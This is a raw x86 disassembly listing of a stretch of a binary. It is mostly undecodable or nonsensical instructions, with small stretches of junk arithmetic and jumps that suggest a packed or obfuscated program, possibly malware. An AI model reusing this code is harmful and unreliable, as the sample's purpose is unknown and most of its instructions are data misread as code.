  4097cc:	test   BYTE PTR [edx-0x74],bl
  4097cf:	inc    ebp
  4097d0:	lahf   
  4097d1:	in     eax,0x3e
  4097d3:	or     esi,ebp
  4097d5:	dec    esi
  4097d6:	mov    DWORD PTR ds:0x49c3376b,esp
  4097dc:	popa   
  4097dd:	xchg   edx,eax
  4097de:	repz in al,dx
  4097e0:	cli    
  4097e1:	and    al,0x72
  4097e3:	or     al,0xc6
  4097e5:	xchg   edi,eax
  4097e6:	push   ds
  4097e7:	cmp    edx,DWORD PTR [edx]
  4097e9:	mov    ds:0x5bbc0c6b,eax
  4097ee:	lods   eax,DWORD PTR ds:[esi]
  4097ef:	or     bh,BYTE PTR [esi-0x41307fb]
  4097f5:	movlhps xmm0,xmm7
  4097f8:	cwde   
  4097f9:	aam    0xbb
  4097fb:	and    ebx,DWORD PTR [eax]
  4097fd:	xchg   esp,eax
  4097fe:	gs mov eax,0x8f82d17c
  409804:	test   al,0x7e
  409806:	push   esi
  409807:	push   edx
  409808:	loop   0x4097bb
  40980a:	pusha  
  40980b:	cdq    
  40980c:	mov    dh,0x90
  40980e:	ret    
  40980f:	adc    DWORD PTR [edi-0x2d],ebp
  409812:	or     esi,ecx
  409814:	je     0x40981a
  409816:	mov    bh,0xbf
  409818:	sbb    eax,0xf3b1776f
  40981d:	add    al,0x73
  40981f:	jg     0x40988f
  409821:	and    DWORD PTR [esp+eiz*2],edi
  409824:	xchg   DWORD PTR [ebx-0x1ef8099e],edx
  40982a:	dec    edi
  40982b:	retf   0xf2be
  40982e:	into   
  40982f:	rcl    ebp,cl
  409831:	scas   al,BYTE PTR es:[edi]
  409832:	push   edi
  409833:	and    ecx,DWORD PTR [ebp+0x37]
  409836:	push   eax
  409837:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409838:	xor    BYTE PTR [ecx+eiz*8-0x63],ah
  40983c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40983d:	scas   al,BYTE PTR es:[edi]
  40983e:	in     eax,dx
  40983f:	adc    edx,DWORD PTR [ebx-0x21]
  409842:	scas   al,BYTE PTR es:[edi]
  409843:	rcr    DWORD PTR [ecx],0x21
  409846:	cmp    eax,DWORD PTR [esi+ebp*1+0x70]
  40984a:	call   0x1116affb
  40984f:	(bad)  
  409850:	jmp    0xdc16:0x9e4827ee
  409857:	cs jno 0x4098bb
  40985a:	sbb    DWORD PTR [edx+0x2a],0x1
  40985e:	dec    ecx
  40985f:	inc    ecx
  409860:	test   BYTE PTR [ecx],ah
  409862:	inc    ecx
  409863:	call   0x289a7051
  409868:	add    dl,dl
  40986a:	mov    ss,WORD PTR [edx+esi*8+0x69aea7f4]
  409871:	inc    eax
  409872:	out    0x3f,al
  409874:	js     0x4098da
  409876:	mov    ebp,es
  409878:	inc    esi
  409879:	xchg   edx,eax
  40987a:	test   DWORD PTR [ecx],0x30865616
  409880:	test   al,0x46
  409882:	dec    ebp
  409883:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409884:	lock lods al,BYTE PTR ds:[esi]
  409886:	mov    eax,ds:0xc3b18083
  40988b:	push   0xffffffff
  40988d:	(bad)  
  40988f:	pop    ss
  409890:	mov    ds:0x5fa1a7f0,eax
  409895:	add    DWORD PTR ds:0x965f7eed,0xd15c8fca
  40989f:	in     al,dx
  4098a0:	xor    eax,DWORD PTR [eax-0x4dd4b49c]
  4098a6:	mov    esp,0x29e69835
  4098ab:	or     ecx,DWORD PTR [ebx]
  4098ad:	fs jb  0x4098f1
  4098b0:	push   eax
  4098b1:	std    
  4098b2:	add    DWORD PTR [esi],0xffffffac
  4098b5:	or     al,0x3a
  4098b7:	push   esi
  4098b8:	jp     0x409929
  4098ba:	push   ecx
  4098bb:	loop   0x4098ba
  4098bd:	in     eax,dx
  4098be:	and    eax,0x406cc0bd
  4098c3:	dec    ecx
  4098c4:	and    eax,0xcd2f33c6
  4098c9:	stc    
  4098ca:	fwait
  4098cb:	neg    DWORD PTR [edi-0x26]
  4098ce:	cli    
  4098cf:	in     al,dx
  4098d0:	sti    
  4098d1:	mov    ebp,0xde4171d6
  4098d6:	into   
  4098d7:	loope  0x4098d9
  4098d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098da:	add    al,0xc5
  4098dc:	sub    eax,0xd14eb972
  4098e1:	mov    bh,0x1b
  4098e3:	pop    es
  4098e4:	mov    ah,0x52
  4098e6:	adc    ebp,edx
  4098e8:	mov    ds:0x364f2336,al
  4098ed:	div    BYTE PTR [bp+si+0x7a]
  4098f1:	cdq    
  4098f2:	retf   
  4098f3:	or     al,0xdf
  4098f5:	xor    al,0xc
  4098f7:	lods   al,BYTE PTR ds:[esi]
  4098f8:	std    
  4098f9:	push   ss
  4098fa:	icebp  
  4098fb:	push   es
  4098fc:	push   edi
  4098fd:	jp     0x409963
  4098ff:	cmp    eax,0xaf93e551
  409904:	stos   DWORD PTR es:[edi],eax
  409905:	push   ecx
  409906:	ins    DWORD PTR es:[edi],dx
  409907:	push   edi
  409908:	(bad)  
  409909:	fs pusha 
  40990b:	inc    esi
  40990c:	fcomp  QWORD PTR [eax]
  40990e:	int    0xf5
  409910:	jae    0x409978
  409912:	cs cld 
  409914:	sbb    al,0x4e
  409916:	adc    ebp,DWORD PTR [edx]
  409918:	sahf   
  409919:	or     DWORD PTR [ecx-0x7578701f],0x880b22cd
  409923:	fwait
  409924:	add    DWORD PTR [ecx-0x11],edi
  409927:	mov    al,0xce
  409929:	fist   DWORD PTR [esi]
  40992b:	nop
  40992c:	cli    
  40992d:	cli    
  40992e:	jmp    0x4098e0
  409930:	outs   dx,DWORD PTR ds:[esi]
  409931:	and    DWORD PTR ss:[ecx],0xffffffdb
  409935:	call   0x7448:0x871bf7e3
  40993c:	pop    eax
  40993d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40993e:	pop    edi
  40993f:	xor    BYTE PTR [edi],bl
  409941:	popf   
  409942:	lds    esi,FWORD PTR [edx+0x62]
  409945:	xor    al,0x84
  409947:	pop    ebp
  409948:	inc    eax
  409949:	clc    
  40994a:	mov    edi,0xc6c9baac
  40994f:	int    0x57
  409951:	or     BYTE PTR [ecx-0x73668fad],0x2f
  409958:	fs pop ebx
  40995a:	inc    edi
  40995b:	push   edx
  40995c:	push   ebx
  40995d:	pop    ecx
  40995e:	push   cs
  40995f:	jl     0x4099b5
  409961:	sub    eax,0x5c92a3f3
  409966:	mov    ch,0x20
  409968:	(bad)  
  409969:	pop    ss
  40996a:	sbb    al,0xad
  40996c:	dec    ebp
  40996d:	and    ebp,ecx
  40996f:	dec    ecx
  409970:	ret    0x662b
  409973:	mov    ds:0xda704908,al
  409978:	fadd   QWORD PTR [esi+edi*2]
  40997b:	stos   DWORD PTR es:[edi],eax
  40997c:	xor    BYTE PTR [ecx],al
  40997e:	inc    ecx
  40997f:	lock inc ebp
  409981:	pop    edi
  409982:	dec    edi
  409983:	int3   
  409984:	xchg   ecx,eax
  409985:	rcl    DWORD PTR gs:[eax-0x1c],cl
  409989:	push   ss
  40998a:	(bad)  
  40998c:	lods   al,BYTE PTR ds:[esi]
  40998d:	(bad)  
  40998e:	(bad)  
  40998f:	fcmovnbe st,st(3)
  409991:	cmp    DWORD PTR [eax+0x6c4f1b9],edi
  409997:	pop    esp
  409998:	sbb    DWORD PTR [edi-0x12],ecx
  40999b:	int3   
  40999c:	sub    DWORD PTR [ecx-0x4d],esi
  40999f:	dec    edx
  4099a0:	xor    DWORD PTR [ecx],edx
  4099a2:	add    DWORD PTR [edx],eax
  4099a4:	aam    0x55
  4099a6:	retf   
  4099a7:	mov    edi,0x3fa650fd
  4099ac:	mov    ch,0x72
  4099ae:	mov    edx,es
  4099b0:	adc    BYTE PTR [ecx+0x785e67e],0x5c
  4099b7:	push   ebx
  4099b8:	pop    esp
  4099b9:	cmp    DWORD PTR [edi+eiz*1-0x5d0912e0],ebp
  4099c0:	scas   eax,DWORD PTR es:[edi]
  4099c1:	lock nop
  4099c3:	or     DWORD PTR ds:0x75158951,eax
  4099c9:	test   al,0x42
  4099cb:	add    BYTE PTR [ecx-0x48],dl
  4099ce:	lahf   
  4099cf:	cld    
  4099d0:	mov    ds:0x8505c705,eax
  4099d5:	test   al,0x42
  4099d7:	add    bl,bh
  4099d9:	dec    ecx
  4099da:	add    BYTE PTR [eax],al
  4099dc:	mov    DWORD PTR [ebp-0x4],eax
  4099df:	mov    DWORD PTR ds:0x42a875,edi
  4099e5:	mov    ecx,DWORD PTR [ebp-0x4]
  4099e8:	mov    DWORD PTR ds:0x42a7f9,0x12dd
  4099f2:	mov    DWORD PTR [ebp-0x8],0x4f35
  4099f9:	cmp    ecx,eax
  4099fb:	jne    0x40a060
  409a01:	xor    ecx,DWORD PTR ds:0x42a779
  409a07:	jmp    0x409cfa
  409a0c:	(bad)  
  409a0d:	retf   
  409a0e:	rcl    dh,1
  409a10:	xlat   BYTE PTR ds:[ebx]
  409a11:	fxch   st(2)
  409a13:	fst    DWORD PTR [ecx+0x7bec14cf]
  409a19:	jmp    0x7878:0xf7b62c99
  409a20:	push   edx
  409a21:	jle    0x409a9b
  409a23:	js     0x409a75
  409a25:	and    al,BYTE PTR [eax-0x27824c52]
  409a2b:	stos   BYTE PTR es:[edi],al
  409a2c:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a2f:	adc    BYTE PTR [esi-0x7712b225],ah
  409a35:	rcl    ebx,cl
  409a37:	nop
  409a38:	jae    0x409a85
  409a3a:	iret   
  409a3b:	int    0x30
  409a3d:	mov    ch,0xea
  409a3f:	mov    cl,0x89
  409a41:	mov    ah,0x3f
  409a43:	push   esi
  409a44:	aad    0xb8
  409a46:	or     BYTE PTR [ebp+0x36],cl
  409a49:	push   es
  409a4a:	cs jg  0x409aae
  409a4d:	pusha  
  409a4e:	mov    bl,0xb7
  409a50:	out    0x4,al
  409a52:	(bad)  
  409a53:	push   eax
  409a54:	popf   
  409a55:	pop    es
  409a56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a57:	push   esp
  409a58:	pop    ebx
  409a59:	ds mov cl,0xac
  409a5c:	ficom  WORD PTR [ebp+0xc37101]
  409a62:	push   es
  409a63:	mov    ah,0xb9
  409a65:	xchg   ch,dh
  409a67:	popa   
  409a68:	jl     0x758797af
  409a6e:	add    bh,BYTE PTR [esi]
  409a70:	outs   dx,DWORD PTR ds:[esi]
  409a71:	sub    DWORD PTR [edi],eax
  409a73:	jmp    0x409add
  409a75:	pop    edx
  409a76:	push   edi
  409a77:	cmp    edx,DWORD PTR [ecx-0x3]
  409a7a:	sti    
  409a7b:	(bad)  
  409a7c:	pop    ecx
  409a7d:	or     eax,0xd20d0522
  409a82:	out    0xfe,al
  409a84:	mov    ah,0x38
  409a86:	inc    esp
  409a87:	xor    DWORD PTR [ebx+0x3aaa3e76],ebp
  409a8d:	mov    ebx,0x5cbf42e
  409a92:	sbb    eax,DWORD PTR [ebx+0x11]
  409a95:	test   BYTE PTR [edi+0x3c714d49],0xae
  409a9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a9d:	ins    BYTE PTR es:[edi],dx
  409a9e:	xchg   ebx,eax
  409a9f:	sti    
  409aa0:	mov    ch,0xf2
  409aa2:	das    
  409aa3:	test   al,0x9b
  409aa5:	push   esp
  409aa6:	out    dx,eax
  409aa7:	jg     0x409b26
  409aa9:	pop    esp
  409aaa:	adc    edx,DWORD PTR [ebx-0x96690ce]
  409ab0:	pop    ebx
  409ab1:	mov    esi,esp
  409ab3:	xchg   ah,dl
  409ab5:	stos   DWORD PTR es:[edi],eax
  409ab6:	xchg   ebp,eax
  409ab7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ab8:	pop    edx
  409ab9:	call   0xe079:0x5bdc3779
  409ac0:	mov    eax,ds:0xffc7480e
  409ac5:	enter  0x48f0,0xdc
  409ac9:	adc    BYTE PTR [ebx],ch
  409acb:	adc    DWORD PTR gs:[edi-0x37],eax
  409acf:	cwde   
  409ad0:	sub    ch,bh
  409ad2:	push   0x84868bbb
  409ad7:	pop    es
  409ad8:	inc    ebx
  409ad9:	scas   al,BYTE PTR es:[edi]
  409ada:	test   DWORD PTR [edx],0x67d7ce09
  409ae0:	cld    
  409ae1:	pop    esi
  409ae2:	push   cs
  409ae3:	cmp    eax,DWORD PTR [ecx-0x71]
  409ae6:	pop    ecx
  409ae7:	test   ecx,ecx
  409ae9:	ret    
  409aea:	cmp    DWORD PTR [edi+0x2e],ebx
  409aed:	push   ss
  409aee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409aef:	retf   
  409af0:	push   0xba29f59d
  409af5:	sar    BYTE PTR [ebx],0x9d
  409af8:	mov    bh,ch
  409afa:	and    esp,DWORD PTR [ebx+0x23d0bd7b]
  409b00:	mov    ds:0x701d07da,al
  409b05:	jecxz  0x409b12
  409b07:	fcmovne st,st(3)
  409b09:	aas    
  409b0a:	lock push ebx
  409b0c:	call   0xef274b86
  409b11:	retf   0x91b3
  409b14:	push   edx
  409b15:	es jecxz 0x409b4b
  409b18:	loope  0x409b88
  409b1a:	nop
  409b1b:	and    BYTE PTR [ecx-0x28520ad7],al
  409b21:	pop    eax
  409b22:	push   es
  409b23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b24:	(bad)  
  409b26:	mov    bh,0xf8
  409b28:	mov    dl,0x77
  409b2a:	dec    DWORD PTR [esi-0x67]
  409b2d:	push   esi
  409b2e:	icebp  
  409b2f:	ins    BYTE PTR es:[edi],dx
  409b30:	push   0x33
  409b32:	jle    0x409ad4
  409b34:	xor    DWORD PTR [esi],esi
  409b36:	jge    0x409aec
  409b38:	jmp    0x164:0x4156731c
  409b3f:	aaa    
  409b40:	xchg   esp,eax
  409b41:	adc    al,0x91
  409b44:	das    
  409b45:	(bad)  
  409b46:	push   ebx
  409b47:	test   eax,0x9afdaa7b
  409b4c:	adc    BYTE PTR [ecx+0x1bd0b418],bl
  409b52:	lea    ecx,[eax+0x22]
  409b55:	push   cs
  409b56:	imul   ebp,DWORD PTR [ecx+0x6fe35148],0xffffffca
  409b5d:	adc    al,0x62
  409b5f:	out    0xae,eax
  409b61:	sub    DWORD PTR [esi+ebp*2+0x20251fb6],ebp
  409b68:	fwait
  409b69:	jne    0x409b24
  409b6b:	mov    eax,0x296202b4
  409b70:	jmp    0x712b4c2e
  409b75:	aaa    
  409b76:	push   edi
  409b77:	sub    al,0x85
  409b79:	adc    DWORD PTR [edx-0x740331c0],0xfa7ef7ec
  409b83:	inc    edi
  409b84:	cmc    
  409b85:	jb     0x409ba0
  409b87:	cmp    ah,ch
  409b89:	rcl    ebx,1
  409b8b:	sbb    eax,0x4b67c724
  409b90:	sub    DWORD PTR [ebx+esi*8+0x38],esp
  409b94:	add    BYTE PTR [edx-0x6f],cl
  409b97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b98:	push   ds
  409b99:	into   
  409b9a:	mov    ds:0x29086145,eax
  409b9f:	jg     0x409bb1
  409ba1:	mov    ebx,0x7838a88f
  409ba6:	(bad)  
  409ba7:	jle    0x409bf4
  409ba9:	fbstp  TBYTE PTR [edx+0x4e]
  409bac:	xchg   esi,eax
  409bad:	adc    BYTE PTR [edx+0x2913ed2a],dh
  409bb3:	in     eax,0xb2
  409bb5:	addr16 dec edx
  409bb7:	mov    ecx,0x37b8cc3a
  409bbc:	dec    esp
  409bbd:	jmp    0x40c56188
  409bc2:	mov    ch,0x8
  409bc4:	outs   dx,BYTE PTR ds:[esi]
  409bc5:	nop
  409bc6:	mov    ah,BYTE PTR [esi-0x4f]
  409bc9:	push   ebx
  409bca:	out    dx,eax
  409bcb:	add    DWORD PTR [edi+0x26],esp
  409bce:	mov    dl,BYTE PTR [eax+ebx*4+0x198c5d7d]
  409bd5:	aam    0x85
  409bd7:	sbb    eax,0xf2177ce7
  409bdc:	mov    esi,0x7841237d
  409be1:	mov    edi,DWORD PTR [ebx]
  409be3:	jl     0x409bb9
  409be5:	or     BYTE PTR [ecx-0x4367fe02],dh
  409beb:	lods   eax,DWORD PTR ds:[esi]
  409bec:	in     al,dx
  409bed:	xchg   ebx,eax
  409bee:	and    bh,dh
  409bf0:	aam    0xb6
  409bf2:	js     0x409be1
  409bf4:	fwait
  409bf5:	js     0x409baa
  409bf7:	retf   0x56ce
  409bfa:	pop    eax
  409bfb:	lods   eax,DWORD PTR ds:[esi]
  409bfc:	into   
  409bfd:	or     DWORD PTR [edi+0x2],eax
  409c00:	pop    eax
  409c01:	or     bh,bl
  409c03:	pusha  
  409c04:	cmp    DWORD PTR [esp],0xffffffe6
  409c08:	int3   
  409c09:	scas   eax,DWORD PTR es:[edi]
  409c0a:	jge    0x409bc4
  409c0c:	jno    0x409b90
  409c0e:	jns    0x409bcc
  409c10:	mov    ecx,0xdb90dc52
  409c15:	sahf   
  409c16:	imul   ebx,DWORD PTR [esp+ecx*2],0x21
  409c1a:	xor    al,0x4d
  409c1c:	hlt    
  409c1d:	fs inc edx
  409c1f:	xor    bl,BYTE PTR ds:0x60b67d00
  409c25:	pushf  
  409c26:	dec    ebp
  409c27:	gs out dx,eax
  409c29:	shl    DWORD PTR [ebx+esi*2-0x1ebfd549],0xe6
  409c31:	retf   0x54d2
  409c34:	jmp    0x3756:0x6c25dc51
  409c3b:	cmp    BYTE PTR [edi],dl
  409c3d:	sub    DWORD PTR [edi],edx
  409c3f:	ins    BYTE PTR es:[edi],dx
  409c40:	sub    eax,0xf4301e8d
  409c45:	loop   0x409bd5
  409c47:	or     ecx,ebp
  409c49:	sbb    eax,0xc9d58b65
  409c4e:	fistp  DWORD PTR [edx+0x11be8afd]
  409c54:	xchg   eax,esp
  409c56:	inc    ebp
  409c57:	mov    bh,0xa9
  409c59:	push   edx
  409c5a:	mov    ds:0x7e61c44a,eax
  409c5f:	or     eax,0xae6f7dcb
  409c64:	add    DWORD PTR [eax+0x75],ebx
  409c67:	shr    DWORD PTR [eax+0xa6da79],cl
  409c6d:	loope  0x409cd3
  409c6f:	mov    esi,0x404c4ce2
  409c74:	hlt    
  409c75:	aaa    
  409c76:	jb     0x409cc6
  409c78:	mov    bl,0x8
  409c7a:	jecxz  0x409c55
  409c7c:	lds    ebp,FWORD PTR [ebx-0x55a41678]
  409c82:	loop   0x409c2d
  409c84:	rol    DWORD PTR [ecx-0x683a339a],1
  409c8a:	loope  0x409cfa
  409c8c:	in     al,dx
  409c8d:	add    ah,BYTE PTR [eax+0x1ca3595c]
  409c93:	out    dx,al
  409c94:	adc    eax,0x583cb6dc
  409c99:	add    al,0x90
  409c9b:	fs int3 
  409c9d:	push   cs
  409c9e:	cmp    cl,ah
  409ca0:	adc    BYTE PTR [esi-0x39],bh
  409ca3:	sbb    BYTE PTR [esi+0x5d],bl
  409ca6:	cmp    esi,DWORD PTR [eax]
  409ca8:	push   0xaf1f3e92
  409cad:	mov    ch,0x63
  409caf:	jge    0x409c9d
  409cb1:	inc    eax
  409cb2:	int3   
  409cb3:	mov    al,0xf3
  409cb5:	ret    
  409cb6:	xlat   BYTE PTR ds:[ebx]
  409cb7:	add    ecx,DWORD PTR [edx-0x59e2ca57]
  409cbd:	fcom   QWORD PTR [edi]
  409cbf:	xlat   BYTE PTR ds:[ebx]
  409cc0:	xchg   DWORD PTR [esi-0x566217f4],esp
  409cc6:	mov    cl,0xe2
  409cc8:	cs pop es
  409cca:	pop    ecx
  409ccb:	adc    eax,0xa4dea36e
  409cd0:	loope  0x409c8a
  409cd2:	pusha  
  409cd3:	cmp    ecx,DWORD PTR [eax-0x650b7775]
  409cd9:	mov    edi,0x21248b8b
  409cde:	dec    esi
  409cdf:	(bad)  
  409ce0:	sahf   
  409ce1:	mov    edx,0xc9102f86
  409ce6:	stos   DWORD PTR es:[edi],eax
  409ce7:	hlt    
  409ce8:	ret    
  409ce9:	fs inc ebx
  409ceb:	jae    0x409d50
  409ced:	mov    dh,0x1b
  409cef:	sbb    eax,DWORD PTR [eax-0x111ddaa]
  409cf5:	jmp    0xc5d229a5
  409cfa:	mov    ax,WORD PTR [ebp-0x8]
  409cfe:	sbb    DWORD PTR ds:0x42a779,0x42a805
  409d08:	mov    ecx,0x8a36
  409d0d:	xor    ax,cx
  409d10:	and    ecx,0x5dd3
  409d16:	mov    ecx,0x3afc
  409d1b:	add    ax,cx
  409d1e:	neg    ecx
  409d20:	mov    ecx,DWORD PTR [ebp+0x8]
  409d23:	or     DWORD PTR ds:0x42a77d,0x299c
  409d2d:	movzx  eax,ax
  409d30:	sbb    DWORD PTR ds:0x42a841,0x42a83d
  409d3a:	not    eax
  409d3c:	xor    DWORD PTR ds:0x42a831,0x55d1
  409d46:	and    eax,DWORD PTR [ecx]
  409d48:	jmp    0x40a03b
  409d4d:	ret    
  409d4e:	int3   
  409d4f:	leave  
  409d50:	(bad)  
  409d51:	(bad)  
  409d53:	rcr    ecx,cl
  409d55:	sahf   
  409d56:	inc    edx
  409d57:	imul   edx,DWORD PTR [edi-0x1db689c8],0xffffff88
  409d5e:	hlt    
  409d5f:	js     0x409dd9
  409d61:	push   edx
  409d62:	jle    0x409ddc
  409d64:	js     0x409d83
  409d66:	stos   BYTE PTR es:[edi],al
  409d67:	out    dx,eax
  409d68:	inc    edx
  409d69:	jmp    0x409d3a
  409d6b:	dec    esp
  409d6c:	inc    edi
  409d6d:	jp     0x409dc1
  409d6f:	sar    DWORD PTR [edi+0x7556857c],cl
  409d75:	callw  0x2cdb
  409d79:	push   ss
  409d7a:	icebp  
  409d7b:	mov    ah,0x22
  409d7d:	ret    0x8588
  409d80:	and    cl,BYTE PTR [esi]
  409d82:	add    eax,0x9feb4fb2
  409d87:	and    eax,0x27706614
  409d8c:	or     esi,DWORD PTR [edx+esi*1+0x57]
  409d90:	push   ecx
  409d91:	in     eax,dx
  409d92:	neg    BYTE PTR [ebp-0x1f269919]
  409d98:	and    DWORD PTR [eax-0x4],edx
  409d9b:	in     al,0xc3
  409d9d:	fsubp  st(5),st
  409d9f:	daa    
  409da0:	adc    esp,DWORD PTR [eax-0x3e92cb77]
  409da6:	pushf  
  409da7:	xor    edi,DWORD PTR [edi]
  409da9:	mov    ecx,0xc9d9cba0
  409dae:	mov    esi,0x4e3f2cae
  409db3:	ss fwait
  409db5:	xor    eax,DWORD PTR [eax+0x52]
  409db8:	mov    ebx,0x9c34ff45
  409dbd:	xor    DWORD PTR [ebp-0x17],esi
  409dc0:	pop    es
  409dc1:	rcl    bh,cl
  409dc3:	loop   0x409e19
  409dc5:	(bad)  
  409dc6:	pop    ss
  409dc7:	enter  0x9320,0xf1
  409dcb:	ss xchg esi,eax
  409dcd:	or     dh,BYTE PTR ds:0x6c7521f7
  409dd3:	fs sar bl,cl
  409dd6:	in     eax,0x2
  409dd8:	rcr    DWORD PTR [ebp+0x40],1
  409ddb:	lods   eax,DWORD PTR fs:[esi]
  409ddd:	outs   dx,BYTE PTR ds:[esi]
  409dde:	popf   
  409ddf:	inc    eax
  409de0:	lahf   
  409de1:	je     0x409db1
  409de3:	jecxz  0x409dc4
  409de5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409de6:	xchg   BYTE PTR cs:[esi+0x627121ef],cl
  409ded:	pop    ecx
  409dee:	add    DWORD PTR [ecx+ebx*1],esp
  409df1:	push   ebx
  409df2:	inc    edx
  409df3:	inc    ebp
  409df4:	adc    ebp,DWORD PTR [edx-0x2fb14ec3]
  409dfa:	outs   dx,BYTE PTR ds:[esi]
  409dfb:	sbb    DWORD PTR [edx-0x66],eax
  409dfe:	xor    esi,DWORD PTR [ebx-0x1867ddd6]
  409e04:	cmp    ebx,DWORD PTR [esi]
  409e06:	jo     0x409e60
  409e08:	daa    
  409e09:	push   0xffffffa6
  409e0b:	xchg   edx,eax
  409e0c:	or     BYTE PTR [esi-0x53cea428],dl
  409e12:	inc    edx
  409e13:	or     eax,0xe3650dd2
  409e18:	aad    0xa5
  409e1a:	adc    BYTE PTR [edi-0x6e802c75],al
  409e20:	xchg   ebp,eax
  409e21:	adc    al,0x75
  409e23:	cwde   
  409e24:	mov    ss,edi
  409e26:	jmp    0x409e52
  409e28:	mov    eax,ds:0x3d677db3
  409e2d:	ds push 0xffffffe3
  409e30:	push   ecx
  409e31:	jnp    0x409e6e
  409e33:	imul   BYTE PTR [ebp-0x33]
  409e36:	(bad)  
  409e37:	imul   edx,DWORD PTR [ebp-0x428a9c],0xffffffb6
  409e3e:	dec    ebp
  409e3f:	into   
  409e40:	test   al,0xd0
  409e42:	jecxz  0x409dfe
  409e44:	or     al,dh
  409e46:	xchg   esp,eax
  409e47:	cwde   
  409e48:	pop    ecx
  409e49:	mov    bh,dh
  409e4b:	cmp    eax,0x32463c53
  409e50:	repnz fcomp DWORD PTR [edi+0x6d]
  409e54:	sbb    eax,0xde5f5ca5
  409e59:	shr    DWORD PTR [eax-0xfda8ffb],1
  409e5f:	pop    ds
  409e60:	and    ecx,edx
  409e62:	pop    esi
  409e63:	adc    DWORD PTR [esi+0x33],0xbbea3948
  409e6a:	and    BYTE PTR [edx+0x2d68fedb],dh
  409e70:	inc    DWORD PTR [ecx+0x70]
  409e73:	adc    ah,bh
  409e75:	cwde   
  409e76:	sbb    al,0xdc
  409e78:	jmp    0xf09a:0xba1ba700
  409e7f:	jge    0x409e4c
  409e81:	sub    al,dl
  409e83:	push   esi
  409e84:	frstor [ebp-0x78db2e5b]
  409e8a:	out    dx,eax
  409e8b:	mov    edi,0xabab9ec7
  409e90:	mov    ?,WORD PTR [edx+0x38]
  409e93:	and    DWORD PTR [edx+0x3c194117],edi
  409e99:	inc    esp
  409e9a:	inc    ebx
  409e9b:	sub    DWORD PTR [edx+esi*8],edi
  409e9e:	xchg   esi,eax
  409e9f:	jb     0x409e2a
  409ea1:	add    DWORD PTR [ecx],edx
  409ea3:	mov    ch,0x6
  409ea5:	pusha  
  409ea6:	mov    WORD PTR [edx],fs
  409ea8:	mov    eax,0xb642f74d
  409ead:	pop    esi
  409eae:	mov    ah,0x5c
  409eb0:	add    BYTE PTR [edx],bh
  409eb2:	sub    ebp,DWORD PTR [ebp+edx*1+0x1e]
  409eb6:	test   al,0xad
  409eb8:	gs xchg edi,eax
  409eba:	popf   
  409ebb:	out    dx,eax
  409ebc:	daa    
  409ebd:	cmp    DWORD PTR [ebp+0x36a5c698],eax
  409ec3:	sbb    BYTE PTR [esi+0x4b8b8154],bh
  409ec9:	sbb    eax,0x83bfb332
  409ece:	rol    DWORD PTR [ecx-0x4bedfc1],0x8c
  409ed5:	in     eax,0x1
  409ed7:	lds    edx,FWORD PTR [eax-0x1b]
  409eda:	dec    esp
  409edb:	mov    dh,0x77
  409edd:	shl    al,cl
  409edf:	test   BYTE PTR [edx+0x75],ah
  409ee2:	lahf   
  409ee3:	jo     0x409ece
  409ee5:	cmp    eax,0x7d72d7a1
  409eea:	sub    esp,ebx
  409eec:	push   esi
  409eed:	lea    esi,[edx-0x7bb04617]
  409ef3:	push   0x75b3173e
  409ef8:	loop   0x409f64
  409efa:	or     DWORD PTR [ebx+ebp*2],ebx
  409efd:	nop
  409efe:	mov    edi,0x8463b111
  409f03:	lock jp 0x409f18
  409f06:	outs   dx,DWORD PTR ds:[esi]
  409f07:	addr16 sbb bh,dl
  409f0a:	adc    eax,0x13a5ccf0
  409f0f:	icebp  
  409f10:	pop    ss
  409f11:	xchg   ebp,eax
  409f12:	jne    0x409f31
  409f14:	dec    bh
  409f16:	into   
  409f17:	int    0xfc
  409f19:	mov    al,ds:0x66384d52
  409f1e:	inc    esp
  409f1f:	sbb    eax,0xebc116a5
  409f24:	test   BYTE PTR [ebp+esi*1-0x1dccbe31],cl
  409f2b:	cmp    eax,0xd12dfded
  409f30:	retf   
  409f31:	cmp    eax,0xc9fa6f7d
  409f36:	iret   
  409f37:	int3   
  409f38:	mov    esi,0x86e87abb
  409f3d:	in     eax,dx
  409f3e:	mov    dh,0x24
  409f40:	bound  edx,QWORD PTR [esi+0x15ff2d4a]
  409f46:	imul   ecx,DWORD PTR [ecx-0x2],0xffffffcf
  409f4a:	cbw    
  409f4c:	mov    bl,0x5f
  409f4e:	je     0x409f21
  409f50:	push   esp
  409f51:	push   ecx
  409f52:	jmp    0x6a6:0x67f943a6
  409f59:	fcmovnbe st,st(4)
  409f5b:	xor    BYTE PTR [ebx+ebp*2+0x27],0x8a
  409f60:	mov    ecx,0x41b87fd7
  409f65:	jle    0x409fa0
  409f67:	ret    
  409f68:	mov    DWORD PTR [edi+0x19],eax
  409f6b:	lock sub dh,BYTE PTR [ebx-0x1]
  409f6f:	jne    0x409f01
  409f71:	xchg   esp,eax
  409f72:	addr16 mov edx,ebx
  409f75:	add    edx,esi
  409f77:	mov    BYTE PTR [ecx+0x582cf472],0x8a
  409f7e:	mov    ecx,0xa610032b
  409f83:	dec    edi
  409f84:	sub    edx,ebp
  409f86:	pop    eax
  409f87:	loope  0x409fd4
  409f89:	mov    DWORD PTR [edx],0xe97706bb
  409f8f:	and    DWORD PTR [ecx],edi
  409f91:	loop   0x409f89
  409f93:	xchg   BYTE PTR [edi+0x6e],bl
  409f96:	rcl    eax,0xd0
  409f99:	pop    esi
  409f9a:	(bad)  
  409f9b:	ds pop ebx
  409f9d:	mov    edi,0xeafd760d
  409fa2:	in     al,0x67
  409fa4:	xor    DWORD PTR [ebp-0x18],esi
  409fa7:	jo     0x409fed
  409fa9:	dec    esp
  409faa:	jp     0x409fdd
  409fac:	ficomp WORD PTR [edi]
  409fae:	(bad)  
  409faf:	mov    edi,0xf8ccf361
  409fb4:	or     al,0x6a
